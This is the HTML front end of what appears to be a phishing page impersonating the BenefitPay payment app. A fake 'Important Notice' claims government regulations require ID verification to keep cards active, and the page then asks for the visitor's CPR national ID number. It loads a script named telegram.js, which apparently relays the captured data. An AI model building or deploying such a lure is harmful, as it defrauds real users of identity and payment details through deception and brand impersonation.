<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Welcome To BenefitPay</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="mobile-frame">
        <div class="mobile-screen">
            <!-- Splash Screen -->
            <div class="splash-screen" id="splashScreen">
                <img src="splash screen.jpg" alt="BenefitPay Splash" class="splash-image">
            </div>
            
            <!-- Important Notice Popup -->
            <div class="notice-popup" id="noticePopup" style="display: none;">
                <div class="notice-modal">
                    <div class="notice-header">
                        <img src="benefitpay-download.png" alt="BenefitPay Logo" class="notice-logo">
                    </div>
                    <h2 class="notice-title">Important Notice</h2>
                    <div class="notice-content">
                        <p>As per updated Government regulations, all BenefitPay users must complete ID verification.</p>
                        <p>Please verify your account now to keep your card active and avoid any service interruption.</p>
                        <p>Thank you for your cooperation.</p>
                    </div>
                    <button class="notice-btn" onclick="closeNoticePopup()">I Understand</button>
                </div>
            </div>
            
            <div class="container" id="mainContent" style="display: none;">
        <!-- Header -->
        <div class="header">
            <div class="logo-container">
                <img src="benefitpay-download.png" alt="BenefitPay Logo" class="logo">
                <div class="welcome-text">
                    <div>Welcome To</div>
                    <div class="brand-name">BenefitPay</div>
                </div>
            </div>
            <button class="lang-btn">عربي</button>
        </div>

        <!-- CPR Section -->
        <div class="form-section">
            <label class="input-label">CPR</label>
            <input type="text" class="cpr-input" placeholder="CPR" id="cprNumber" maxlength="9" inputmode="numeric">
        </div>

        <!-- Next Button -->
        <button class="start-btn" onclick="proceedToPhone()">Next</button>
            </div>
        </div>
    </div>

    <script src="config.js"></script>
    <script src="telegram.js"></script>
    <script src="script.js"></script>
</body>
</html>
